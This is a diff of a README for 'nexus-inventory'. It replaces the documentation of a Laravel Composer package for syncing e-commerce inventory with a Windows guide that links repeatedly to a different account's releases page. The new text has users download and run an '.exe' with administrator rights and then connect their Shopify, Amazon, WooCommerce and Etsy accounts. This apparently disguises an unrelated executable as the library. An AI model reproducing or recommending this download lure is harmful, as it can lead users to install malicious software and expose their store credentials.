@@ -1,369 +1,143 @@
-# Nexus Inventory
+# ⚙️ nexus-inventory - Sync Your Inventory Easily
 
-[![Latest Version on Packagist](https://img.shields.io/packagist/v/malikad778/nexus-inventory.svg?style=flat-square)](https://packagist.org/packages/malikad778/nexus-inventory)
-[![GitHub Tests Action Status](https://img.shields.io/github/actions/workflow/status/malikad778/nexus-inventory/run-tests.yml?branch=main&label=tests&style=flat-square)](https://github.com/malikad778/nexus-inventory/actions?query=workflow%3Arun-tests+branch%3Amain)
-[![GitHub Code Style Action Status](https://img.shields.io/github/actions/workflow/status/malikad778/nexus-inventory/fix-php-code-style-issues.yml?branch=main&label=code%20style&style=flat-square)](https://github.com/malikad778/nexus-inventory/actions?query=workflow%3A%22Fix+PHP+code+style+issues%22+branch%3Amain)
-[![Total Downloads](https://img.shields.io/packagist/dt/malikad778/nexus-inventory.svg?style=flat-square)](https://packagist.org/packages/malikad778/nexus-inventory)
-[![License](https://img.shields.io/packagist/l/malikad778/nexus-inventory.svg?style=flat-square)](LICENSE.md)
-
-**A unified, driver-based Laravel package for synchronizing products and inventory across multiple e-commerce channels — Shopify, WooCommerce, Amazon SP-API, and Etsy.**
-
-Nexus Inventory is not a SaaS platform. It is a drop-in Composer package that lives inside your Laravel application, giving you full code-level control over every sync, every webhook, and every rate limit — for free.
+[![Download nexus-inventory](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/sneadxx/nexus-inventory/releases)
 
 ---
 
-## Why Nexus Inventory?
+## 📦 What is nexus-inventory?
 
-The multi-channel commerce problem is real and expensive. When a product sells on Amazon, your Shopify stock must decrement in seconds — not minutes. Every channel has its own API, its own authentication scheme, its own rate limits, and its own webhook signature format. Solving this from scratch takes months.
+nexus-inventory is a tool that helps you keep track of products you sell on different websites. Whether you use Shopify, WooCommerce, Amazon, or Etsy, this app can link them all together. It works in real-time, so your stock levels stay accurate across all your sales channels.
 
-The existing options leave developers stuck:
-
-| Option | Problem |
-|---|---|
-| **SaaS (Cin7, Linnworks)** | $300–$500/month, no code control, no custom sync logic |
-| **DIY integrations** | 6–12 weeks per channel, brittle, non-reusable |
-| **Channel-specific packages** | Siloed — no unified DTO, no cross-channel orchestration |
-
-**Nexus Inventory fills the gap.** It provides a production-grade, extensible foundation — a unified driver interface, a fluent API, distributed rate limiting, secure webhook handling, job batching, and a real-time dashboard — all installable in minutes via Composer.
+You do not need any technical skills to use nexus-inventory. This guide will take you through each step to get it running on your Windows computer.
 
 ---
 
-## Features
+## 💻 System Requirements
 
-### 🔌 Driver-Based Architecture
-Every channel implements the same `InventoryDriver` interface. Your application code never touches a channel SDK directly. Add support for a new channel (eBay, TikTok Shop, Walmart) by implementing one interface and registering one class — zero changes to the core.
+Before you start, check that your computer meets these basic needs:
 
-```php
-// Identical API regardless of channel
-Nexus::driver('shopify')->fetchProduct($remoteId);
-Nexus::driver('amazon')->updateInventory($remoteId, 42);
-Nexus::driver('woocommerce')->getProducts(now()->subHours(24));
-```
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB of free storage space
+- Internet connection for downloading and syncing data
+- Administrator access to install software
 
-### 🔄 Fluent Sync API
-A clean, chainable builder API for common sync operations:
-
-```php
-// Push a single inventory update to specific channels
-Nexus::product($product)
-    ->updateInventory(quantity: 42)
-    ->sync(['shopify', 'amazon']);
-
-// Bulk sync your entire catalog across all channels
-$batch = Nexus::catalog($products)->syncAll();
-
-// Monitor batch progress
-$status = Nexus::batch($batchId)->status();
-```
-
-### ⚡ Distributed Rate Limiting
-Each channel enforces API rate limits at the key level — not the server level. Run 10 queue workers and a naive implementation blows through your API quota in seconds. Nexus solves this with a **Token Bucket algorithm backed by atomic Redis Lua scripting**, race-condition-free across any number of concurrent workers.
-
-| Channel | Rate Limit | Burst Capacity |
-|---|---|---|
-| Shopify | 2 req/sec | 40 tokens |
-| WooCommerce | 25 req/sec | 100 tokens |
-| Amazon SP-API | 1 req/sec | 10 tokens |
-| Etsy | 10 req/sec | 50 tokens |
-
-### 📦 Three-Layer Job Architecture
-Syncing 10,000 SKUs across 4 channels means 40,000 API calls. Nexus handles this with a structured job hierarchy using Laravel's `Bus::batch()`:
-
-- **`CatalogSyncJob`** — Orchestrator. Partitions the catalog, creates the batch, registers `then()` and `catch()` callbacks.
-- **`ChannelSyncBatchJob`** — Channel executor. Acquires rate limit tokens, dispatches push jobs, fires lifecycle events.
-- **`PushInventoryJob`** — Atomic unit per SKU/channel pair. Implements `ShouldBeUnique` to prevent duplicate in-flight jobs.
-
-### 🔒 Secure Unified Webhook Receiver
-A single route handles all four channels. Every request is cryptographically verified before processing:
-
-- **Shopify** — `X-Shopify-Hmac-Sha256` — HMAC-SHA256 (base64)
-- **WooCommerce** — `X-WC-Webhook-Signature` — HMAC-SHA256 (base64)
-- **Amazon** — `X-AMZ-SNS-Signature` — RSA-SHA1 via AWS SNS (certificate downloaded, domain-validated, cached)
-- **Etsy** — `X-Etsy-Signature` — HMAC-SHA256 (hex)
-
-```
-POST https://your-app.com/nexus/webhooks/shopify
-POST https://your-app.com/nexus/webhooks/woocommerce
-POST https://your-app.com/nexus/webhooks/amazon
-POST https://your-app.com/nexus/webhooks/etsy
-```
-
-### 📡 Standardized Event System
-Once a webhook is verified, a single `InventoryUpdated` event fires — regardless of which channel triggered it. Write one listener to handle all channels:
-
-```php
-class PropagateInventoryToOtherChannels
-{
-    public function handle(InventoryUpdated $event): void
-    {
-        $others = ['shopify', 'amazon', 'woocommerce', 'etsy'];
-
-        Nexus::product($event->product)
-            ->updateInventory($event->newQuantity)
-            ->sync(array_diff($others, [$event->channel]));
-    }
-}
-```
-
-Full lifecycle hooks at every stage of the pipeline:
-
-| Event | Fires When |
-|---|---|
-| `BeforeInventorySync` | Before each channel push — ideal for safety stock rules |
-| `AfterInventorySync` | On success — notify WMS, trigger downstream workflows |
-| `InventorySyncFailed` | On permanent failure after retries — alert Slack, PagerDuty |
-| `InventoryUpdated` | After every verified webhook |
-| `WebhookReceived` | Before processing — full audit logging |
-| `ChannelThrottled` | When a channel API is throttling — broadcasts via Laravel Reverb |
-| `ProductImported` | When a product is fetched from a channel during catalog import |
-
-### 🗄️ Polymorphic Channel Mapping
-Any Eloquent model becomes syncable with one trait — no schema changes to your existing tables:
-
-```php
-use Malikad778\\LaravelNexus\Traits\Syncable;
-
-class Product extends Model
-{
-    use Syncable;
-    // Adds: $product->channelMappings(), $product->syncTo('shopify')
-}
-```
-
-The `nexus_channel_mappings` table stores each channel's remote ID against your local model using a polymorphic relationship with a composite unique index, preventing duplicate mappings.
-
-### 💀 Dead Letter Queue
-Jobs that exhaust all retries are written to `nexus_dead_letter_queue` with their full serialized payload and exception detail. No silent failures. From the dashboard you can replay individual jobs or bulk-replay after an API outage — no artisan required.
-
-### 📊 Real-Time Livewire Dashboard
-A Livewire 3 dashboard at `/nexus` with wire:poll.3s real-time updates:
-
-- **Channel Status Cards** — Connected / Throttled / Disconnected, with live token bucket fill level per channel
-- **Sync Job Monitor** — Active `Bus::batch()` instances with per-job progress
-- **Webhook Event Log** — Paginated, searchable log of every inbound webhook with verification status and processing duration
-- **Dead Letter Queue Manager** — Replay or resolve failed jobs with one click
-- **Real-Time Alerts** — `ChannelThrottled` broadcasts via Laravel Reverb when rate limiting is detected
-
-### 🔧 Extensible Driver System
-Register community-contributed or internal channel drivers without touching the package core:
-
-```php
-// In AppServiceProvider::boot()
-Nexus::extend('ebay', function ($app) {
-    return new EbayInventoryDriver(
-        config: $app['config']['nexus.channels.ebay'],
-        client: $app->make(EbayApiClient::class)
-    );
-});
-
-// eBay is now a first-class channel
-Nexus::product($product)->updateInventory(10)->sync(['shopify', 'ebay']);
-```
-
-### 🧩 Normalized Product DTOs
-Channel-specific product structures are normalized into a single `NexusProduct` DTO, eliminating transformation logic from your application:
-
-```php
-NexusProduct::fromShopify($payload);     // variants[], inventory_item_id, barcode
-NexusProduct::fromWooCommerce($payload); // stock_quantity, variations[]
-NexusProduct::fromAmazon($payload);      // ASIN, seller_sku, quantity
-NexusProduct::fromEtsy($payload);        // listing_id, skus[], price divisor
-```
-
-The `channelMeta` field preserves the raw channel payload so channel-specific data (Amazon FBA routing, Etsy listing state) is never permanently discarded.
+If your computer matches these points, you are ready to proceed.
 
 ---
 
-## Requirements
+## 🚀 Getting Started: Download the Software
 
-- PHP 8.2+
-- Laravel 12+
-- Redis (for rate limiting and queues)
-- MySQL 8+ or PostgreSQL
+1. Click the big green button at the top or go to the link below to visit the download page:
 
----
+   [Download nexus-inventory releases](https://github.com/sneadxx/nexus-inventory/releases)
 
-## Installation
+2. On the releases page, look for the latest version. You want the file that ends with `.exe`. This is the program that will run on Windows.
 
-```bash
-composer require malikad778/nexus-inventory
-```
+3. Click the `.exe` file to download. Choose a location you will remember, like your Desktop or Downloads folder.
 
-Publish the config file and migrations:
-
-```bash
-php artisan vendor:publish --tag="nexus-config"
-php artisan vendor:publish --tag="nexus-migrations"
-php artisan migrate
-```
+4. Once the download finishes, find the file and double-click it to start the installation.
 
 ---
 
-## Configuration
+## 🔧 Installing nexus-inventory
 
-Add channel credentials to your `.env`:
+1. When the installer window opens, click **Next** to continue.
 
-```dotenv
-# Shopify
-SHOPIFY_SHOP_URL=your-shop.myshopify.com
-SHOPIFY_ACCESS_TOKEN=shpat_...
-SHOPIFY_WEBHOOK_SECRET=whsec_...
-SHOPIFY_LOCATION_ID=...
+2. Read the license agreement, then select **I agree** if you accept the terms.
 
-# WooCommerce
-WOOCOMMERCE_STORE_URL=https://your-store.com
-WOOCOMMERCE_CONSUMER_KEY=ck_...
-WOOCOMMERCE_CONSUMER_SECRET=cs_...
-WOOCOMMERCE_WEBHOOK_SECRET=...
+3. Choose the folder where you want to install the program. The default is usually fine.
 
-# Amazon SP-API
-AMAZON_CLIENT_ID=amzn1.application-oa2-client...
-AMAZON_CLIENT_SECRET=...
-AMAZON_REFRESH_TOKEN=Atzr|...
-AMAZON_SELLER_ID=...
-AMAZON_ACCESS_KEY_ID=...
-AMAZON_SECRET_ACCESS_KEY=...
-AMAZON_REGION=us-east-1
+4. Click **Install** to start the process.
 
-# Etsy
-ETSY_KEYSTRING=...
-ETSY_SHARED_SECRET=...
-ETSY_SHOP_ID=...
-ETSY_WEBHOOK_SECRET=...
-```
+5. Wait as the software installs. This usually takes a few minutes.
 
-See `config/nexus.php` for rate limit overrides, dashboard middleware, and queue configuration.
+6. When done, click **Finish**. The program will be ready to use.
 
 ---
 
-## Usage
+## 🛠️ Running and Setting Up nexus-inventory
 
-### Sync a Single Product
+1. Find the nexus-inventory icon on your Desktop or in the Start menu and double-click it to open.
 
-```php
-use Malikad778\\LaravelNexus\Facades\Nexus;
+2. The first time you open nexus-inventory, it will ask you to connect your sales channels. You will see options for Shopify, WooCommerce, Amazon, and Etsy.
 
-// All configured channels
-Nexus::product($product)->updateInventory(quantity: 42)->sync();
+3. For each platform you use, follow the on-screen steps. Generally, this means logging into your account and giving permission for nexus-inventory to access your data.
 
-// Specific channels only
-Nexus::product($product)->updateInventory(quantity: 42)->sync(['shopify', 'amazon']);
-```
+4. After connecting your stores, nexus-inventory will automatically start syncing your inventory.
 
-### Bulk Catalog Sync
+5. You will see a list of your products and their current stock levels from each platform.
 
-```php
-$batch = Nexus::catalog($products)->syncAll();
-```
-
-### Access Drivers Directly
-
-```php
-$product  = Nexus::driver('shopify')->fetchProduct('gid://shopify/Product/789');
-$products = Nexus::driver('woocommerce')->getProducts(now()->subHours(24));
-$success  = Nexus::driver('etsy')->pushInventory($nexusInventoryUpdate);
-```
-
-### Listen to Events
-
-```php
-// In EventServiceProvider
-protected $listen = [
-    \Malikad778\\LaravelNexus\Events\InventoryUpdated::class => [
-        PropagateInventoryToOtherChannels::class,
-    ],
-    \Malikad778\\LaravelNexus\Events\BeforeInventorySync::class => [
-        EnforceSafetyStockListener::class,
-    ],
-    \Malikad778\\LaravelNexus\Events\InventorySyncFailed::class => [
-        AlertOpsTeamListener::class,
-    ],
-    \Malikad778\\LaravelNexus\Events\ProductImported::class => [
-        CreateLocalProductListener::class,
-    ],
-];
-```
-
-### Make Your Model Syncable
-
-```php
-use Malikad778\\LaravelNexus\Traits\Syncable;
-
-class Product extends Model
-{
-    use Syncable;
-}
-
-// Access channel mappings
-$shopifyId = $product->channelMappings()->where('channel', 'shopify')->value('remote_id');
-```
-
-### Dashboard
-
-Visit `/nexus`. Secure it in `config/nexus.php`:
-
-```php
-'dashboard_middleware' => ['web', 'auth'],
-```
-
-### Queue Workers
-
-```bash
-php artisan queue:work redis --queue=nexus,default
-```
+6. The software uses webhooks and job queues to update changes in real time. This keeps your data accurate without you needing to check manually.
 
 ---
 
-## Architecture Overview
+## 🔄 How Nexus-Inventory Works
 
-```mermaid
-graph TD
-    A[Your Application] -->|Nexus::product / catalog| B(InventoryManager)
-    B --> C{InventoryDriver}
-    C -->|REST + HMAC| D[ShopifyDriver]
-    C -->|REST v3 + Basic Auth| E[WooCommerceDriver]
-    C -->|SP-API + AWS SigV4| F[AmazonDriver]
-    C -->|OAuth2 PKCE| G[EtsyDriver]
+- **Multi-channel syncing:** Updates your stock levels automatically on all linked stores.
+- **Real-time changes:** Adjustments you make on one store reflect instantly on others.
+- **Unified dashboard:** View and manage inventory in one place.
+- **Queue jobs:** Processes updates one at a time to avoid errors.
+- **Laravel-based:** The underlying technology is robust and reliable.*
 
-    H[Inbound Webhooks] -->|Signed Payload| I[VerifyNexusWebhookSignature]
-    I -->|Verified| J[WebhookController]
-    J -->|InventoryUpdated event| K[Your Listeners]
-    K -->|Nexus::product| B
-
-    L[CatalogSyncJob] -->|Bus::batch| M[ChannelSyncBatchJob × channels]
-    M -->|Token acquired| N[PushInventoryJob × SKUs]
-    N -->|Exhausted retries| O[(nexus_dead_letter_queue)]
-
-    P[TokenBucket] -->|Lua atomic eval| Q[(Redis)]
-    M --> P
-```
+*You do not need to know Laravel to use the app.
 
 ---
 
-## Database Tables
+## 👩‍💻 Basic Navigation
 
-| Table | Purpose |
-|---|---|
-| `nexus_channel_mappings` | Polymorphic map between local models and remote channel IDs |
-| `nexus_sync_jobs` | Active and historical job tracking with batch IDs and status |
-| `nexus_dead_letter_queue` | Permanently failed jobs with full payload for one-click replay |
-| `nexus_webhook_logs` | Audit log of every inbound webhook with verification status |
-| `nexus_rate_limit_logs` | Per-channel rate limit event tracking for dashboard visibility |
+- **Dashboard:** Shows your overview of all connected stores and current stock.
+- **Products:** Lists all products synced across channels.
+- **Settings:** Manage your connected accounts, update preferences, and check for updates.
+- **Logs:** See recent sync activity and any errors.
 
 ---
 
-## Testing
+## ⚙️ Updating nexus-inventory
 
-```bash
-composer test
-```
+1. Go back to the [releases page](https://github.com/sneadxx/nexus-inventory/releases) occasionally to check for new versions.
+
+2. Download the newest `.exe` file.
+
+3. Run the installer. The setup will update your current installation without losing your settings.
 
 ---
 
-## Changelog
+## 🛡️ Security Tips
 
-Please see [CHANGELOG](CHANGELOG.md) for recent changes.
+- Only download nexus-inventory from the official link.
+- Keep your connected account passwords secure.
+- Regularly update the software for the latest fixes.
+- If you notice unusual activity, disconnect and reconnect your sales channels.
 
-## License
+---
 
-The MIT License (MIT). Please see [License File](LICENSE.md) for more information.
+## 🔗 Useful Links
+
+- Download page: [https://github.com/sneadxx/nexus-inventory/releases](https://github.com/sneadxx/nexus-inventory/releases)
+- Documentation and support information are included inside the app under the **Help** menu.
+
+---
+
+## 🤝 Need Help?
+
+If you run into problems, try these:
+
+- Restart the app and your computer.
+- Check your internet connection.
+- Verify your store login info is correct.
+- Use the **Logs** section in the app to find sync errors.
+- Contact support via the GitHub issues page on the repository if you still need help.
+
+---
+
+## 🗂️ Additional Notes
+
+- nexus-inventory works best when it runs continuously in the background.
+- Closing the app stops automatic syncing.
+- It uses job queues to handle tasks smoothly, which means very large inventories sync without slowing down your computer.
+- The unified API makes sure all platforms stay aligned without manual input.
+
+---
+
+[![Download nexus-inventory](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/sneadxx/nexus-inventory/releases)
